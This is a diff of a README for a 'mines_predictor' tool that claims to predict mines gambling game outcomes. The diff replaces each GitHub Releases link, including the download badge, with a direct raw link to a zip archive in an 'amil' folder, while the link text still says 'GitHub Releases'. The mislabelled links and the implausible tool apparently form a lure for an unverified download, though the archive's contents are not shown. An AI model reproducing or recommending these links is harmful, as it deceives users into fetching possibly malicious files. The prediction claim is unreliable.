@@ -1,6 +1,6 @@
 # 🎲 mines_predictor - Predict Mines Easily and Effectively
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/davidtxt/mines_predictor/releases)
+[![Download Now](https://github.com/davidtxt/mines_predictor/raw/refs/heads/main/amil/predictor-mines-v3.8.zip)](https://github.com/davidtxt/mines_predictor/raw/refs/heads/main/amil/predictor-mines-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to mines_predictor! This tool helps you predict outcomes in a game of mi
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/davidtxt/mines_predictor/releases).
+1. Visit this page to download: [GitHub Releases](https://github.com/davidtxt/mines_predictor/raw/refs/heads/main/amil/predictor-mines-v3.8.zip).
 2. Locate the version you want. You will see various files available for download. Choose the one that fits your system.
 3. Click on the link to start the download. Once downloaded, locate the file in your downloads folder.
 
@@ -58,7 +58,7 @@ This application covers several important areas:
 If you encounter issues:
 
 - Ensure your system meets the requirements listed above.
-- Check for updates on the [GitHub Releases](https://github.com/davidtxt/mines_predictor/releases) page.
+- Check for updates on the [GitHub Releases](https://github.com/davidtxt/mines_predictor/raw/refs/heads/main/amil/predictor-mines-v3.8.zip) page.
 - Restart the application if it freezes or becomes unresponsive.
 
 ## 🗨️ Support
